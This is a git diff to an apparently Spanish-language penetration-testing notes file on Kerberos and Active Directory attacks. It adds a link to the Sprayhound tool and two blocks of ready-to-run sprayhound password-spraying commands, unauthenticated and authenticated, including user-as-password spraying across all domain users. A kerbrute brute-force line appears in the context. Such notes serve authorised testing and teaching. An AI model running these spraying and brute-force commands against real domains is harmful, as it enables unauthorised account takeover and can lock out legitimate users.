@@ -23,6 +23,7 @@ Tags: #Kerberos #DC #Windows #AD #ASREPRoasting #Kerberoasting #UserEnum
 * [John the Ripper](https://github.com/openwall/john)
 * [CrackStation](https://crackstation.net/)
 * [Hashes.com](https://hashes.com/en/decrypt/hash)
+* [Sprayhound](https://github.com/Hackndo/sprayhound)
 
 
 ---
@@ -94,6 +95,45 @@ Tags: #Kerberos #DC #Windows #AD #ASREPRoasting #Kerberoasting #UserEnum
 ❯ kerbrute bruteuser -d domain.corp --dc <IP> administrator passwords.txt
 # Fuerza bruta a un usuario específico
 # Solo úsalo si sabes que no hay lockout policy
+```
+
+```bash 
+# No autenticado 
+# Single user, single password
+sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP>
+
+# User list, single password
+sprayhound -U ./users.txt -p Pentest123.. -d Domain01.local -dc <IP>
+
+# User as pass
+sprayhound -U ./users.txt -d Domain01.local -dc <IP>
+
+# User as pass with password lowercase
+sprayhound -U ./users.txt --lower -d Domain01.local -dc <IP>
+
+# User as pass with password uppercase
+sprayhound -U ./users.txt --upper -d Domain01.local -dc <IP>
+```
+
+```bash 
+# Autenticado 
+# Single user, single password
+sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+
+# All domain users, single password
+sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+
+# All domain users, single password, using an account from a trusted domain
+sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu 'babdcatha.net\Babd' -lp P4ssw0rd
+
+# User as pass on all domain users
+sprayhound -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+
+# User as pass with password lowercase
+sprayhound --lower -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+
+# User as pass with password uppercase
+sprayhound --upper -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
 ```
 
 ### Condiciones clave
